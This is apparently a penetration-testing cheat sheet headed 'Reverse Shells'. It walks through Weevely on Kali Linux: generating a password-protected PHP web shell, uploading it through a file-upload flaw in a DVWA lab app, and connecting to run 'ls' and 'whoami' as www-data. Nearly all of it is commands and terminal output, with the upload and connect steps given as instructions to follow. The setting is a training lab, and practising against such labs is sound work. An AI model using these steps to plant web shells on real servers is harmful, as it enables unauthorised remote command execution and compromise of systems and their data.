Reverse Shells

[*] Weevely
    Generate the reverse shell file:

        root@kali:~/Desktop# weevely generate -h
        usage: weevely generate [-h] [-obfuscator {cleartext1_php,obfusc1_php}]
                                [-agent {obfpost_php}]
                                password path

        positional arguments:
          password              Agent password
          path                  Agent file path

        optional arguments:
          -h, --help            show this help message and exit
          -obfuscator {cleartext1_php,obfusc1_php}
          -agent {obfpost_php}

        root@kali:~/Desktop# weevely generate 12345 /root/Desktop/powned.php
        Generated '/root/Desktop/powned.php' with password '12345' of 771 byte size.

    Upload the file on your vulnerable web app running php.
    Use Weevely to execute.

        root@kali:~/Desktop# weevely http://192.168.122.11/dvwa/vulnerabilities/upload/../../hackable/uploads/powned.php 12345

        [+] weevely 4.0.1

        [+] Target:     192.168.122.11
        [+] Session:    /root/.weevely/sessions/192.168.122.11/powned_0.session

        [+] Browse the filesystem or execute commands starts the connection
        [+] to the target. Type :help for more information.

        weevely> ls
        The remote script execution triggers an error 500, check script and payload integrity
        dvwa_email.png
        example.php
        meterpreter.js
        meterpreter.jsp
        meterpreter.php
        meterpreter.sh
        msfvenom.php
        powned.php
        reverse.elf
        shell.elf
        test.txt
        www-data@192.168.122.11:/var/www/dvwa/hackable/uploads $ whoami
        The remote script execution triggers an error 500, check script and payload integrity
        www-data
